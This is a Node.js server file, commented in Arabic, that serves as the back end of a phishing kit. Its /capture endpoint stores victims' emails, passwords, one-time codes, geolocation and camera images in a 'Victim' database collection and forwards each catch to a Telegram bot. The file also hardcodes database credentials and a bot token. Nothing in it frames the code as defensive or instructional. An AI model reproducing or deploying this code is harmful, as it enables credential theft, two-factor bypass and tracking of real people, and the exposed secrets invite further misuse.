const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// اتصال قوي وقاعدة بيانات مرنة
mongoose.connect(MONGO_URI).then(() => console.log("✅ Database Active")).catch(e => console.log("DB Offline"));

const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, password: String, otp: String, location: Object, image: String, device: String, date: { type: Date, default: Date.now }
}));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/capture', async (req, res) => {
    try {
        const data = req.body;
        // حفظ في MongoDB
        const entry = new Victim(data);
        await entry.save();

        // إرسال لتيليجرام بتنسيق احترافي
        let msg = `🔥 **صيد خبيث جديد**\n\n📧 الإيميل: \`${data.email}\` \n🔑 الباسورد: \`${data.password}\` \n🔢 الرمز: \`${data.otp || 'قيد الانتظار'}\` \n📱 الجهاز: ${data.device}`;
        
        if (data.location) {
            msg += `\n📍 الخريطة: https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        }

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });

        // إذا وجدت صورة، أرسلها كملف
        if (data.image) {
            const base64Data = data.image.replace(/^data:image\/png;base64,/, "");
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                chat_id: CHAT_ID,
                photo: data.image
            });
        }

        res.status(200).json({ status: "ok" });
    } catch (e) { res.status(500).send(e.message); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Evil Server Ready"));
